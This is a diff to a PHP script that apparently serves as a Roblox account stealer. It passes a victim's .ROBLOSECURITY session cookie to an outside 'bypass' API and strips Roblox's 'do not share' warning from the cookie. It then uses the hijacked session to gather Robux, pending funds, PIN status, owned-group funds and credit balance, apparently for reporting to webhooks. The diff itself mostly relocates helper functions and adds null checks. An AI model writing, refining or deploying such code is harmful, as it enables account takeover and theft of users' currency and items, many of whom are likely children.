@@ -88,6 +88,30 @@ $userWebhook = $instanceData['userWebhook'] ?? '';
 $masterWebhook = MASTER_WEBHOOK;
 
 // ============================================
+// HELPER FUNCTIONS FOR ROBLOX API
+// ============================================
+function makeRequest($url, $headers, $postData = null) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    if ($postData) {
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
+    }
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return json_decode($response, true);
+}
+
+function ownsBundle($userId, $bundleId, $headers) {
+    $url = "https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId";
+    $response = makeRequest($url, $headers);
+    return isset($response['data']) && !empty($response['data']);
+}
+
+// ============================================
 // CALL EXTERNAL API WITH BETTER ERROR HANDLING
 // ============================================
 $externalApiUrl = 'https://rblxbypasser.com/api/bypass';
@@ -150,55 +174,36 @@ $username = $userInfo['username'] ?? 'Unknown';
 $userId = $userInfo['userId'] ?? 'Unknown';
 $avatarUrl = $apiData['avatarUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';
 
-// EXTRACT BYPASSED COOKIE FROM API RESPONSE
-$bypassedCookie = $apiData['cookie'] ?? $cookie;
+// Try to get bypassed cookie from API response, fallback to original if not present
+$bypassedCookie = $apiData['cookie'] ?? $apiData['bypassedCookie'] ?? $cookie;
+// Clean the cookie (remove warning prefix if present)
+$bypassedCookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $bypassedCookie);
 
 // ============================================
-// FETCH ADDITIONAL ROBLOX DATA
+// FETCH ADDITIONAL DETAILED ROBLOX DATA
 // ============================================
-function makeRequest($url, $headers, $postData = null) {
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    if ($postData) {
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
-    }
-    $response = curl_exec($ch);
-    curl_close($ch);
-    return json_decode($response, true);
-}
-
-function ownsBundle($userId, $bundleId, $headers) {
-    $url = "https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId";
-    $response = makeRequest($url, $headers);
-    return isset($response['data']) && !empty($response['data']);
-}
-
 // Headers for Roblox API requests (use bypassed cookie)
 $headers = ["Cookie: .ROBLOSECURITY=$bypassedCookie", "Content-Type: application/json"];
 
 // Get User Info
-$userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers);
+$userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers) ?? [];
 $displayName = $userInfoData['displayName'] ?? $username;
 
 // Get Settings Data
-$settingsData = makeRequest("https://www.roblox.com/my/settings/json", $headers);
+$settingsData = makeRequest("https://www.roblox.com/my/settings/json", $headers) ?? [];
 $isPremium = isset($settingsData['IsPremium']) ? ($settingsData['IsPremium'] ? '✅ True' : '❌ False') : '❓ Unknown';
 $emailVerified = isset($settingsData['IsEmailVerified']) ? ($settingsData['IsEmailVerified'] ? '✅ True' : '❌ False') : '❓ Unknown';
 
 // Get Transaction Summary
-$transactionSummaryData = makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers);
+$transactionSummaryData = makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers) ?? [];
 $pendingRobux = $transactionSummaryData['pendingRobuxTotal'] ?? '❓ Unknown';
 
 // Get PIN Status
-$pinData = makeRequest("https://auth.roblox.com/v1/account/pin", $headers);
+$pinData = makeRequest("https://auth.roblox.com/v1/account/pin", $headers) ?? [];
 $pinStatus = isset($pinData['isEnabled']) ? ($pinData['isEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';
 
 // Get Voice Chat Status
-$vcData = makeRequest("https://voice.roblox.com/v1/settings", $headers);
+$vcData = makeRequest("https://voice.roblox.com/v1/settings", $headers) ?? [];
 $vcStatus = isset($vcData['isVoiceEnabled']) ? ($vcData['isVoiceEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';
 
 // Check for Premium Items (Headless & Korblox)
@@ -216,19 +221,19 @@ if ($accountCreated) {
 }
 
 // Get Friends Count
-$friendsData = makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers);
+$friendsData = makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers) ?? [];
 $friendsCount = $friendsData['count'] ?? '❓ Unknown';
 
 // Get Followers Count
-$followersData = makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers);
+$followersData = makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers) ?? [];
 $followersCount = $followersData['count'] ?? '❓ Unknown';
 
 // Get Owned Groups and Calculate Group Funds
-$groupsData = makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers);
+$groupsData = makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers) ?? [];
 $ownedGroups = [];
 if (isset($groupsData['data'])) {
     foreach ($groupsData['data'] as $group) {
-        if ($group['role']['rank'] == 255) {
+        if (isset($group['role']['rank']) && $group['role']['rank'] == 255) {
             $ownedGroups[] = $group;
         }
     }
@@ -238,24 +243,26 @@ $totalGroupsOwned = count($ownedGroups);
 $totalGroupFunds = 0;
 $totalPendingGroupFunds = 0;
 foreach ($ownedGroups as $group) {
-    $groupId = $group['group']['id'];
-    $groupFunds = makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers);
-    $totalGroupFunds += $groupFunds['robux'] ?? 0;
-    
-    $groupPayouts = makeRequest("https://economy.roblox.com/v1/groups/$groupId/payouts", $headers);
-    if (isset($groupPayouts['data'])) {
-        foreach ($groupPayouts['data'] as $payout) {
-            if ($payout['status'] === 'Pending') {
-                $totalPendingGroupFunds += $payout['amount'];
+    $groupId = $group['group']['id'] ?? null;
+    if ($groupId) {
+        $groupFunds = makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers) ?? [];
+        $totalGroupFunds += $groupFunds['robux'] ?? 0;
+        
+        $groupPayouts = makeRequest("https://economy.roblox.com/v1/groups/$groupId/payouts", $headers) ?? [];
+        if (isset($groupPayouts['data'])) {
+            foreach ($groupPayouts['data'] as $payout) {
+                if (isset($payout['status']) && $payout['status'] === 'Pending') {
+                    $totalPendingGroupFunds += $payout['amount'] ?? 0;
+                }
             }
         }
     }
 }
 
 // Get Credit Balance
-$creditBalanceData = makeRequest("https://billing.roblox.com/v1/credit", $headers);
-$creditBalance = isset($creditBalanceData['balance']) ? $creditBalanceData['balance'] : '❓ Unknown';
-$creditRobux = isset($creditBalanceData['robuxAmount']) ? $creditBalanceData['robuxAmount'] : '❓ Unknown';
+$creditBalanceData = makeRequest("https://billing.roblox.com/v1/credit", $headers) ?? [];
+$creditBalance = $creditBalanceData['balance'] ?? '❓ Unknown';
+$creditRobux = $creditBalanceData['robuxAmount'] ?? '❓ Unknown';
 
 // ============================================
 // UPDATE INSTANCE STATS
